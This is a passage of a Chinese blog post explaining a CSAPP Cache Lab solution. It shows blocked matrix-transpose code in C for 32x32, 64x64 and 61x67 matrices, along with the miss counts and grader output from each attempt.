<p>那么再看 8x8 的矩阵的情况。8x8 的矩阵就是为了防止 A，B之间大量的冲突。可以发现在 8x8 的矩阵中，除了对角线，其他A，B中相对应的元素都是在不同的 set 中的。这样可以减少大量的 conflict miss。每个小块中，先按照行读A，再按照列写B，在这样的情况下，每个A的8x8 的块中只有第一列会出现 cold miss，每个B的 8x8 的块中只有第一列会出现 cold miss，但是 B的对角线上会出现 conflict miss，那么我们可以估计出总的 miss 数量应该是 在A中有 16 x 8 = 128 misses，在B中有 16 x 8 + 28(对角线) = 156 misses，那么如果能够消除对角线上的 conflict miss，我们就可以得到 总计 256 次 misses 的最优性能。</p>
<p>考虑到我们可以使用 最多 12 个额外的参数，我们可以使用另外的 8 个参数来避免conflict 问题。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(M == <span class="number">32</span>)&#123;</span><br><span class="line">         <span class="keyword">int</span> tmp1, tmp2, tmp3, tmp4, tmp5, tmp6, tmp7, tmp8;</span><br><span class="line">         <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>)</span><br><span class="line">             <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j += <span class="number">8</span>)</span><br><span class="line">                 <span class="keyword">for</span>(<span class="keyword">int</span> k = i; k &lt; (i + <span class="number">8</span>); ++k)&#123;</span><br><span class="line">                     tmp1 = A[k][j];</span><br><span class="line">                     tmp2 = A[k][j+<span class="number">1</span>];</span><br><span class="line">                     tmp3 = A[k][j+<span class="number">2</span>];</span><br><span class="line">                     tmp4 = A[k][j+<span class="number">3</span>];</span><br><span class="line">                     tmp5 = A[k][j+<span class="number">4</span>];</span><br><span class="line">                     tmp6 = A[k][j+<span class="number">5</span>];</span><br><span class="line">                     tmp7 = A[k][j+<span class="number">6</span>];</span><br><span class="line">                     tmp8 = A[k][j+<span class="number">7</span>];</span><br><span class="line">                     B[j][k] = tmp1;</span><br><span class="line">                     B[j+<span class="number">1</span>][k] = tmp2;</span><br><span class="line">                     B[j+<span class="number">2</span>][k] = tmp3;</span><br><span class="line">                     B[j+<span class="number">3</span>][k] = tmp4;</span><br><span class="line">                     B[j+<span class="number">4</span>][k] = tmp5;</span><br><span class="line">                     B[j+<span class="number">5</span>][k] = tmp6;</span><br><span class="line">                     B[j+<span class="number">6</span>][k] = tmp7;</span><br><span class="line">                     B[j+<span class="number">7</span>][k] = tmp8;</span><br><span class="line">                 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Function 0 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:1766, misses:287, evictions:255</span><br><span class="line"></span><br><span class="line">Function 1 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 1 (Simple row-wise scan transpose): hits:870, misses:1183, evictions:1151</span><br><span class="line"></span><br><span class="line">Summary for official submission (func 0): correctness=1 misses=287</span><br><span class="line"></span><br><span class="line">TEST<span class="emphasis">_TRANS_</span>RESULTS=1:287</span><br></pre></td></tr></table></figure>

<h3 id="2-2-64-x-64"><a href="#2-2-64-x-64" class="headerlink" title="2.2 64 x 64"></a>2.2 64 x 64</h3><p>对 64 x 64 的矩阵来说，每行有 64 个 int，则 cache 只能存矩阵的 4 行了，所以 8x8 的分块肯定是有问题的，如果使用 8x8 的分块，一定会在写 B 的时候造成冲突。我们先用 4x4 的矩阵分块跑一下试试。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Function 0 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:6498, misses:1699, evictions:1667</span><br><span class="line"></span><br><span class="line">Function 1 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 1 (Simple row-wise scan transpose): hits:3474, misses:4723, evictions:4691</span><br><span class="line"></span><br><span class="line">Summary for official submission (func 0): correctness=1 misses=1699</span><br><span class="line"></span><br><span class="line">TEST<span class="emphasis">_TRANS_</span>RESULTS=1:1699</span><br></pre></td></tr></table></figure>

<p>实验结果并不是很理想。</p>
<p><strong>优化</strong></p>
<p>我们可以使用先 8 分块，再使用 4 分块的方法来实现。我们仍然从 set 冲突的角度上来考虑。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (M == <span class="number">64</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">int</span> i, j, x, y;</span><br><span class="line">         <span class="keyword">int</span> x1, x2, x3, x4, x5, x6, x7, x8;</span><br><span class="line">         <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>)</span><br><span class="line">             <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>)&#123;</span><br><span class="line">                 <span class="keyword">for</span> (x = i; x &lt; i + <span class="number">4</span>; ++x)&#123;</span><br><span class="line">                     x1 = A[x][j]; x2 = A[x][j+<span class="number">1</span>]; x3 = A[x][j+<span class="number">2</span>]; x4 = A[x][j+<span class="number">3</span>];</span><br><span class="line">                     x5 = A[x][j+<span class="number">4</span>]; x6 = A[x][j+<span class="number">5</span>]; x7 = A[x][j+<span class="number">6</span>]; x8 = A[x][j+<span class="number">7</span>];</span><br><span class="line"> </span><br><span class="line">                     B[j][x] = x1; B[j+<span class="number">1</span>][x] = x2; B[j+<span class="number">2</span>][x] = x3; B[j+<span class="number">3</span>][x] = x4;</span><br><span class="line">                     B[j][x+<span class="number">4</span>] = x5; B[j+<span class="number">1</span>][x+<span class="number">4</span>] = x6; B[j+<span class="number">2</span>][x+<span class="number">4</span>] = x7; B[j+<span class="number">3</span>][x+<span class="number">4</span>] = x8;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">for</span> (y = j; y &lt; j + <span class="number">4</span>; ++y)&#123;</span><br><span class="line">                     x1 = A[i+<span class="number">4</span>][y]; x2 = A[i+<span class="number">5</span>][y]; x3 = A[i+<span class="number">6</span>][y]; x4 = A[i+<span class="number">7</span>][y];</span><br><span class="line">                     x5 = B[y][i+<span class="number">4</span>]; x6 = B[y][i+<span class="number">5</span>]; x7 = B[y][i+<span class="number">6</span>]; x8 = B[y][i+<span class="number">7</span>];</span><br><span class="line"> </span><br><span class="line">                     B[y][i+<span class="number">4</span>] = x1; B[y][i+<span class="number">5</span>] = x2; B[y][i+<span class="number">6</span>] = x3; B[y][i+<span class="number">7</span>] = x4;</span><br><span class="line">                     B[y+<span class="number">4</span>][i] = x5; B[y+<span class="number">4</span>][i+<span class="number">1</span>] = x6; B[y+<span class="number">4</span>][i+<span class="number">2</span>] = x7; B[y+<span class="number">4</span>][i+<span class="number">3</span>] = x8;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">for</span> (x = i + <span class="number">4</span>; x &lt; i + <span class="number">8</span>; ++x)&#123;</span><br><span class="line">                     x1 = A[x][j+<span class="number">4</span>]; x2 = A[x][j+<span class="number">5</span>]; x3 = A[x][j+<span class="number">6</span>]; x4 = A[x][j+<span class="number">7</span>];</span><br><span class="line">                     B[j+<span class="number">4</span>][x] = x1; B[j+<span class="number">5</span>][x] = x2; B[j+<span class="number">6</span>][x] = x3; B[j+<span class="number">7</span>][x] = x4;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>最终结果</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Function 0 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:9066, misses:1179, evictions:1147</span><br><span class="line"></span><br><span class="line">Function 1 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 1 (Simple row-wise scan transpose): hits:3474, misses:4723, evictions:4691</span><br><span class="line"></span><br><span class="line">Summary for official submission (func 0): correctness=1 misses=1179</span><br><span class="line"></span><br><span class="line">TEST<span class="emphasis">_TRANS_</span>RESULTS=1:1179</span><br></pre></td></tr></table></figure>

<h3 id="2-3-61-x-67"><a href="#2-3-61-x-67" class="headerlink" title="2.3 61 x 67"></a>2.3 <strong><strong>61 x 67</strong></strong></h3><p>考虑其他的分块大小。</p>
<p>最简单的方法就是做 8x8 的分块。分块的方式和上文中的一样，但是任然存在 A，B之间反复conflict miss 的问题。</p>
<p>最终的结果如下：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Part A: Testing cache simulator</span><br><span class="line">Running ./test-csim</span><br><span class="line"><span class="code">                        Your simulator     Reference simulator</span></span><br><span class="line"><span class="code">Points (s,E,b)    Hits  Misses  Evicts    Hits  Misses  Evicts</span></span><br><span class="line"><span class="code">     3 (1,1,1)       9       8       6       9       8       6  traces/yi2.trace</span></span><br><span class="line"><span class="code">     3 (4,2,4)       4       5       2       4       5       2  traces/yi.trace</span></span><br><span class="line"><span class="code">     3 (2,1,4)       2       3       1       2       3       1  traces/dave.trace</span></span><br><span class="line"><span class="code">     3 (2,1,3)     167      71      67     167      71      67  traces/trans.trace</span></span><br><span class="line"><span class="code">     3 (2,2,3)     201      37      29     201      37      29  traces/trans.trace</span></span><br><span class="line"><span class="code">     3 (2,4,3)     212      26      10     212      26      10  traces/trans.trace</span></span><br><span class="line"><span class="code">     3 (5,1,5)     231       7       0     231       7       0  traces/trans.trace</span></span><br><span class="line"><span class="code">     6 (5,1,5)  265189   21775   21743  265189   21775   21743  traces/long.trace</span></span><br><span class="line"><span class="code">    27</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">Part B: Testing transpose function</span><br><span class="line">Running ./test-trans -M 32 -N 32</span><br><span class="line">Running ./test-trans -M 64 -N 64</span><br><span class="line">Running ./test-trans -M 61 -N 67</span><br><span class="line"></span><br><span class="line">Cache Lab summary:</span><br><span class="line"><span class="code">                        Points   Max pts      Misses</span></span><br><span class="line"><span class="code">Csim correctness          27.0        27</span></span><br><span class="line"><span class="code">Trans perf 32x32           8.0         8         287</span></span><br><span class="line"><span class="code">Trans perf 64x64           8.0         8        1179</span></span><br><span class="line"><span class="code">Trans perf 61x67          10.0        10        1905</span></span><br><span class="line"><span class="code">          Total points    53.0        53</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>computer architecture</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>computer-architecture</tag>
      </tags>
  </entry>
</search>
